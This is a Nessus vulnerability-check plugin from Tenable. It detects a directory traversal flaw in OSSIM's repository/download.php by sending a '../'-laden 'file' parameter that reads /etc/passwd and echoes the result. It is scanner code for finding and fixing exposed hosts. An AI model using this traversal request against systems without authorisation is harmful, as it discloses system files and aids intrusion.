#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45082);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2014/08/09 00:11:24 $");

  script_bugtraq_id(38780);
  script_osvdb_id(63051);
  script_xref(name:"Secunia", value:"38969");

  script_name(english:"OSSIM download.php Directory Traversal");
  script_summary(english:"Tries to get /etc/passwd");

  script_set_attribute(attribute:"synopsis", value:
"An application hosted on the remote web server has a directory
traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of OSSIM hosted on the remote host has a directory
traversal vulnerability. Input to the 'file' parameter of the
'ossim/repository/download.php' script is not properly sanitized.

A remote attacker could exploit this to download arbitrary files,
subject to the privileges under which the web server operates.

This version of OSSIM likely has other vulnerabilities in its web
interface, though Nessus has not checked for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4bd9f4c5");
  script_set_attribute(attribute:"see_also", value:"http://www.alienvault.com/docs/2.2.1_release_notes.txt");
  script_set_attribute(attribute:"solution", value:"Upgrade to OSSIM 2.2.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("ossim_web_detect.nasl");
  script_require_keys("www/ossim", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'ossim', port:port);
if (isnull(install)) exit(0, "OSSIM wasn't detected on port "+port+".");

file = '/etc/passwd';
qs = 'file=../../../../../../../..'+file+'&name='+SCRIPT_NAME+'-'+unixtime();
url = install['dir']+'/repository/download.php?'+qs;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (res[2] && egrep(string:res[2], pattern:'root:.*:0:[01]:'))
{
  if (report_verbosity > 0)
  {
    trailer = NULL;

    if (report_verbosity > 1)
    {
      trailer =
        '\nWhich resulted in the following response :\n\n'+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n'+
        res[2]+'\n'+
        crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n';
    }

    report = get_vuln_report(items:url, port:port, trailer:trailer);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  base_url = build_url(port:port, qs:install['dir']+'/');
  exit(0, 'The OSSIM install at '+base_url+' is not affected.');
}
